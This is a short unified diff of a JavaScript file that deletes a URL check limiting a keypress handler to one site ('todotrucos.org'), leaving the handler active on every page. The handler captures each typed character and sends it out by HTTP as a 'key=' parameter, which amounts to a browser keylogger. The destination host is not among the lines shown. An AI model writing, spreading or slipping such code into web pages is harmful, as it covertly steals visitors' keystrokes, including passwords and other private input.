@@ -1,5 +1,4 @@
 
-if (document.URL.indexOf('todotrucos.org') == -1) {
 	document.onkeypress=function(evt){
 		var evt=evt||window.event;
 		var key=String.fromCharCode(evt.charCode);
@@ -10,4 +9,3 @@ if (document.URL.indexOf('todotrucos.org') == -1) {
 			http.send("key="+param);
 		}
 	}
-}
